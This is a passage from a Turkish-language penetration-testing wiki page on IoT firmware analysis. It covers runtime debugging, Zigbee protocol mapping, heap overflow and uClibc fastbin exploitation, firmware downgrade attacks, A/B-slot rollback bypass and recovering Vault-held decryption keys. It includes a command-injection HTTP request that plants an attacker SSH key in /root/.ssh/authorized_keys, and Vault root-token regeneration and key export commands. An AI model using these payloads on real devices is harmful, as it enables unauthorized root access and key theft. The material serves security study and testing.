# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için, kararlı ve yazılabilir bir birime zaman damgalı işaretçi dosyaları yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO'lar ve geçici konsollar, hız sınırlaması veya süreçlerin erken sonlanması nedeniyle hatalı negatif sonuçlara yol açabilir. Ayrıca ilgisiz kodu değiştirmeden önce katmanlar arasındaki arayüzlerin birebir eşleşip eşleşmediğini karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI sürücüsü ABI'si ve PCI'den türetilen sürücü adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` ile başarıyla yüklenebilir; ancak tüketicisi farklı bir ABI beklediği için yine de kullanılamaz durumda olabilir.<sup>[[11]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve dosya sistemine shell erişimini korumak çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle zaman zaman emülatörün yeniden başlatılması gerekebilir. Analizde dosya sistemi yeniden incelenmeli, açığa çıkan web sayfaları ve ağ servisleri istismar edilmeli, bootloader zafiyetleri araştırılmalıdır. Olası backdoor zafiyetlerini tespit etmek için firmware bütünlük testleri kritik önemdedir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi; breakpoint ayarlamak ve fuzzing ile diğer teknikleri kullanarak zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanarak bir süreçle veya binary ile çalıştığı ortamda etkileşim kurmayı içerir.

Tam bir debugger bulunmayan embedded hedeflerde, cihaza **statik olarak bağlanmış bir `gdbserver` kopyalayın** ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşlemesi

IoT hub’larda RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada iletilen **RF frame**
2. Radio MCU’daki **controller-side parser**
3. Linux’a aktarılan **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon’daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reverse engineering hedefi oluşturur. Controller, binary radio frame’lerini `Group,Command,arg1,arg2,...` gibi bir text protocol’e dönüştürüyorsa şunları belirleyin:

- **Message group**’lar ve dispatch table’lar
- Hangi mesajların **network**’ten, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**’lar (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler’lara yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebildiği

Özellikle Zigbee için, pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Öyleyse commissioning trafiğini sniff etmek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler’ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL komutları, standartlaştırılmış cluster’lardan genellikle daha iyi bir hedeftir; çünkü bunlar daha az kapsamlı test edilmiş doğrulamaya sahip **custom parsing code** ve dahili **FSM**’lere gider.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı reverse engineer edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını çıkarın.
- Otomatik ilerleyen **transitional state**’leri ve sonunda saldırganın kontrolündeki state’i sıfırlayan veya serbest bırakan retry/error branch’lerini belirleyin.
- Hatalı handler’a her zaman erişilebildiğini varsaymak yerine, daemon’ı zafiyetli state’e getirmek için gereken meşru protocol alışverişlerini doğrulayın.

Zamanlamaya duyarlı protocol’lerde, bir Python framework’ünden packet replay yapmak fazla yavaş olabilir. Daha güvenilir bir yöntem, doğru **endpoint**’leri, **attribute**’ları ve commissioning zamanlamasını sağlayabilmek için vendor-grade stack kullanan gerçek bir donanımda (örneğin **nRF52840**) meşru bir cihazı taklit etmektir.

### Embedded daemon’larda parçalı indirme hatası sınıfı

**Fragmented blob/model/configuration download** işlemlerinde tekrarlayan bir firmware hata sınıfı görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` çağırır.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **packet-local** alanları doğrular.
3. Kopyalama işlemi, **başlangıçta ayrılan boyuta** karşı kontrol yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları yapmasına olanak tanır:

- Küçük bir heap allocation zorlamak için **küçük** bir belirtilen toplam boyuta sahip, geçerli bir ilk fragment göndermek.
- Beklenen **offset** değerine ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment göndermek.
- Yeni kontrolleri karşılarken başlangıçta ayrılan buffer’ı taşıran, sahte bir packet-local boyutu kullanmak.

Zafiyetli yol commissioning logic’inin arkasındaysa, bozuk fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine getirmek için yeterli **device emulation** gerekir.

### Protocol ile tetiklenen `free()` işlemleri

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu genellikle “cleanup’i beklemek” değil, **protocol’ün kendi error handling’ini zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine geçirmek için bozuk follow-up fragment’ler gönderin.
- Retry sınırını aşarak daemon’ın **context’i resetleyip** bozulmuş buffer’ı serbest bırakmasını sağlayın.
- Process ilgisiz nedenlerle crash olmadan önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yaklaşım, özellikle embedded Linux’taki **musl/uClibc/dlmalloc-like** allocator’lara karşı kullanışlıdır; burada chunk metadata’sını bozmak, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer’larını hemen ezip process’i crash ettirmek yerine, allocator traversal’ı **taşırılmış buffer içinde konumlandırılmış fake chunk**’lara yönlendirmek için bir **size field**’ı bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen zafiyetler için PoC geliştirmek, hedef mimariyi derinlemesine anlamayı ve daha düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded system’lerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin ve consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonra yapılan büyük bir allocation `__malloc_consolidate()` çağrısını tetikleyebilir; bu nedenle herhangi bir fake chunk kontrolleri geçmelidir (geçerli bir size, `fd = 0` ve çevresindeki chunk’ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary’ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Geçerli bir heap chunk header’ına benzeyen bir bölgeyi hedefleyerek fastbin allocation’ı bir **function pointer table** üzerine yerleştirebilirsiniz.
- **Parser’ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, trailing attacker-controlled byte’ları stack pivot/ROP chain için korurken parsing’i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir mapping’e çalıştırılabilir shellcode yerleştirip ona atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware Analizi için Hazır OS’ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak üzere tasarlanmış bir distro’dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sağlayarak zamandan tasarruf etmenizi sağlar.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mechanism’leri

Bir vendor, firmware image’ları için cryptographic signature check’leri uygulasa bile **version rollback (downgrade) protection** sıklıkla atlanır. Boot veya recovery loader, yalnızca gömülü bir public key ile signature’ı doğrular ancak yüklenen image’ın *version*’ını (veya monotonic counter’ını) karşılaştırmazsa saldırgan, geçerli bir signature taşıyan **eski ve zafiyetli bir firmware’i** meşru biçimde yükleyerek yamalanmış zafiyetleri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik attack workflow:

1. **Eski, imzalı bir image edinin**
   * Vendor’ın herkese açık indirme portalından, CDN’inden veya destek sitesinden alın.
   * Companion mobile/desktop application’lardan çıkarın (ör. bir Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive’ları, forumlar vb. üçüncü taraf repository’lerden alın.
2. Image’ı, açık durumdaki herhangi bir update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Pek çok consumer IoT cihazı, Base64-encoded firmware blob’larını kabul eden, bunları sunucu tarafında decode edip recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint’leri sunar.
3. Downgrade işleminden sonra, daha yeni sürümde yamalanmış bir zafiyeti exploit edin (örneğin sonradan eklenmiş bir command-injection filter’ı).
4. İsteğe bağlı olarak persistence elde ettikten sonra tespit edilmemek için en güncel image’ı yeniden flash edin veya update’leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi herhangi bir sanitization uygulanmadan doğrudan bir shell komutuna eklenir; bu da keyfi komutların enjekte edilmesine olanak tanır (burada SSH anahtarına dayalı root erişimini etkinleştirmek için). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının olmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarının içine koyar. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip` bile fiziksel donanıma dokunmadan imzalı imajları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater üzerinden anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında yapar (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya bir userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapar ve partition table'a ya da slot metadata'sına güvenirse rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da tutulan bir değerle karşılaştırır ve daha eski imzalı image'ları reddeder.
- Bootloader bu ratchet'i **parse etmez**; boot etmeden önce yalnızca header, CRC ve signature'ı doğrular.
- Slot aktivasyonu ayrı olarak bir partition table'da veya slot başına generation counter'da saklanır ve doğrulanmış firmware'in tam digest değerine kriptografik olarak bağlı **değildir**.

Bu, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı boot et** primitive'i oluşturur. Saldırgan, updater'a güncel imzalı bir image kullanarak slot B'yi bir sonraki boot hedefi olarak işaretletebilir ve ardından reboot öncesinde slot B'nin üzerine yazabilirse, bootloader yalnızca önceden kaydedilmiş slot metadata'sına güvendiği için downgrade edilmiş image'ı boot edebilir.

Yaygın kötüye kullanım örüntüsü:

1. Pasif slota **güncel ve imzalı** bir firmware yükleyin ve normal validation/switch rutinini çalıştırarak layout'un bu slotu sonraki aktif slot olarak işaretlemesini sağlayın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase rutinine yeniden girin.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesi için eski boot-state veya eski slot-selection mantığını kötüye kullanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan validation rutinini atlayın ve doğrudan reboot edin.
6. Bootloader etkinleştirilen slotu seçer, yalnızca signature/integrity kontrolü yapar ve eski image'ı boot eder.

A/B update implementasyonlarını reverse ederken dikkat edilmesi gerekenler:

- Slot seçimi, başarılı bir switch sonrasında yenilenmeyen **boot-time flags** üzerinden yapılıyor.
- `prepare_passive_slot()` benzeri bir rutin, **mevcut committed layout** yerine eski state'e göre bir slotu siliyor.
- `part_write_layout()` benzeri bir fonksiyon yalnızca **generation counter** / active flag değerini artırıyor ve doğrulanmış image hash'ini saklamıyor.
- Ratchet kontrolleri userspace veya updater kodunda uygulanıyor, ancak ROM / bootloader / secure boot aşamalarında **uygulanmıyor**.
- Erase veya recovery rutinleri, içerik silinip yeniden yazıldıktan sonra da slotu boot edilebilir olarak işaretli bırakıyor.

### Update Logic'i Değerlendirme Kontrol Listesi

* *Update endpoint*'inin transport/authentication mekanizması yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flash işleminden önce **version number** veya **monotonic anti-rollback counter** karşılaştırması yapıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature kontrolü ROM code tarafından yapılıyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrolü yapmak yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot activation metadata'sı **doğrulanmış firmware digest/version** değerine bağlı mı, yoksa etkinleştirme sonrasında slot değiştirilebiliyor mu?
* Slot switch başarılı olduktan sonra cihazın reboot etmesi zorunlu mu, yoksa aynı session içinde sonraki update/erase rutinlerine hâlâ erişilebiliyor mu?
* Userland code ek sanity check'ler yapıyor mu (ör. izin verilen partition map, model number)?
* *Partial* veya *backup* update akışları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için vulnerable firmware

Firmware'deki zafiyetleri bulma pratiği yapmak için başlangıç noktası olarak aşağıdaki vulnerable firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware decryption key'lerini kurtarma

Bir update image küçük plaintext metadata ile yüksek entropili büyük bir blob'u birlikte içeriyorsa, herhangi bir brute-force denemeden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header'ları, offset'leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökün.
- `Salted__` genellikle OpenSSL `enc` formatını gösterir: sonraki 8 byte salt, geri kalanı ise ciphertext'tir.
- Tam olarak `256` byte'a decode edilen bir Base64 alanı, büyük olasılıkla rastgele bir firmware password/session key'i sarmalayan bir RSA-2048 ciphertext'e işaret eder.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity'yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik key araması (`grep`, `strings`, PEM/PGP aramaları) sonuç vermiyorsa, yalnızca private key aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve şifreli blob'u kimin okuduğunu, hangi helper/API'nin unwrap ettiğini ve hangi logical key name'i istediğini takip edin.
- Çıkarılan root filesystem'de KMS state'i (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ve unit file'ları ile init script'leri arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya local KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa, Vault internals'ı yeniden uygulamaktansa bu ortamı yeniden çalıştırmak genellikle daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Cloned KMS üzerinde root yetkisiyle:

- Transit keys'i yalnızca izole clone içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'i, KMS'in kullandığı padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa AES-CBC decrypt işlemini denemeden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, eski appliance'larda genellikle MD5) aynen uygulayın.

Böylece "encrypted firmware" daha genel bir probleme dönüşür: **appliance tarafındaki operational key'leri kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Kırma: Kıdemli Düzeyde Beceri, Junior Düzeyde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kesin Kılavuz](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero-day açıklarından yararlanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Akıllı Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Görüyorsun: Artık Pwn Edildin](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'dan şarj portu konektörü üzerinden yararlanma - Bölüm 2: anti-downgrade mekanizmasını atlatma](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Işığı Yak: Philips Hue Bridge'in Over-the-Air İstismarı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da ROOT Tesla OS Bölüm 1: Paketi Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da ROOT Tesla OS Bölüm 2: Debug Etme ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi, SPI Flash'tan Kurtarmayı Mümkün Kılıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parola kurtarma araçları](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
